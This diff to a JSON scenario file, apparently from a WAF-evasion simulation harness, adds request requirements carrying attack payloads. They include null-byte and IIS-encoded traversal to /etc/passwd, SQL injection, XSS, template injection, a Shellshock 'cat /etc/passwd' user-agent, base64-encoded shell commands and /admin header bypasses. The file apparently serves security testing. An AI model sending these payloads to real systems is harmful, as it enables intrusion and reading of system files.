       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "NULL_PAYLOADS-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "../../etc/passwd\u0000.jpg"
+            }
+          },
+          {
+            "id": "NULL_PAYLOADS-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "../../etc/passwd\u0000.png"
+            }
+          },
+          {
+            "id": "NULL_PAYLOADS-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "select\u0000 * from users"
+            }
+          },
+          {
+            "id": "NULL_PAYLOADS-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<script\u0000>alert(1)</script>"
+            }
+          },
+          {
+            "id": "NULL_PAYLOADS-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "admin\u0000"
+            }
+          },
+          {
+            "id": "NULL_PAYLOADS-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test.php\u0000.jpg"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%u003Cscript%u003Ealert(1)%u003C/script%u003E"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%u0027 OR 1=1--"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%u003Cimg src=x onerror=alert(1)%u003E"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "..%u2216..%u2216etc/passwd"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "..%u2215..%u2215etc/passwd"
+            }
+          },
+          {
+            "id": "IIS_PAYLOADS-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "null-byte-or-iis-encoding",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "%u0022 onmouseover=%u0022alert(1)"
+            }
+          },
+          {
+            "id": "base64-q-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            }
+          },
+          {
+            "id": "base64-data-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+              "decode": "true"
+            }
+          },
+          {
+            "id": "base64-q-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "JyBPUiAxPTEtLQ=="
+            }
+          },
+          {
+            "id": "base64-data-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "JyBPUiAxPTEtLQ==",
+              "decode": "true"
+            }
+          },
+          {
+            "id": "base64-q-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "e3s3Kjd9fQ=="
+            }
+          },
+          {
+            "id": "base64-data-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "e3s3Kjd9fQ==",
+              "decode": "true"
+            }
+          },
+          {
+            "id": "base64-q-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "Y2F0IC9ldGMvcGFzc3dk"
+            }
+          },
+          {
+            "id": "base64-data-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "Y2F0IC9ldGMvcGFzc3dk",
+              "decode": "true"
+            }
+          },
+          {
+            "id": "base64-q-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "OyBscyAtbGEgLw=="
+            }
+          },
+          {
+            "id": "base64-data-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "OyBscyAtbGEgLw==",
+              "decode": "true"
+            }
+          },
+          {
+            "id": "base64-q-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "YWRtaW4nIEFORCAnMSc9JzE="
+            }
+          },
+          {
+            "id": "base64-data-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "base64-decode-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "data": "YWRtaW4nIEFORCAnMSc9JzE=",
+              "decode": "true"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "waf-encoding-evasion/06-case-chunked-evasion",
@@ -11535,7 +12898,251 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "COOKIE_PAYLOADS-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=' OR 1=1--"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=%27%20OR%201%3D1--"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session={{7*7}}"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-6",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=${7*7}"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-7",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "session=../../etc/passwd"
+            }
+          },
+          {
+            "id": "COOKIE_PAYLOADS-8",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-cookie",
+            "minimum_dispatches": 1,
+            "headers": {
+              "cookie": "user=admin%00; session=valid"
+            }
+          },
+          {
+            "id": "REFERER_PAYLOADS-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-referer",
+            "minimum_dispatches": 1,
+            "headers": {
+              "referer": "https://evil.com/<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "REFERER_PAYLOADS-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-referer",
+            "minimum_dispatches": 1,
+            "headers": {
+              "referer": "https://evil.com/%3Cscript%3Ealert(1)%3C/script%3E"
+            }
+          },
+          {
+            "id": "REFERER_PAYLOADS-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-referer",
+            "minimum_dispatches": 1,
+            "headers": {
+              "referer": "https://evil.com/' OR 1=1--"
+            }
+          },
+          {
+            "id": "REFERER_PAYLOADS-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-referer",
+            "minimum_dispatches": 1,
+            "headers": {
+              "referer": "https://evil.com/{{7*7}}"
+            }
+          },
+          {
+            "id": "UA_PAYLOADS-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-user-agent",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "UA_PAYLOADS-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-user-agent",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "' OR 1=1--"
+            }
+          },
+          {
+            "id": "UA_PAYLOADS-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-user-agent",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "{{7*7}}"
+            }
+          },
+          {
+            "id": "UA_PAYLOADS-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-user-agent",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "() { :;}; /bin/bash -c 'cat /etc/passwd'"
+            }
+          },
+          {
+            "id": "UA_PAYLOADS-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "encoded-user-agent",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "%3Cscript%3Ealert(1)%3C/script%3E"
+            }
+          },
+          {
+            "id": "header-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-forwarded-for": "127.0.0.1' OR 1=1--"
+            }
+          },
+          {
+            "id": "header-1",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-forwarded-for": "<script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "header-2",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-original-url": "/admin"
+            }
+          },
+          {
+            "id": "header-3",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-rewrite-url": "/admin"
+            }
+          },
+          {
+            "id": "header-4",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-custom-ip-authorization": "127.0.0.1"
+            }
+          },
+          {
+            "id": "header-5",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "custom-header-evasion",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml;charset=utf-7"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/01-sqli",
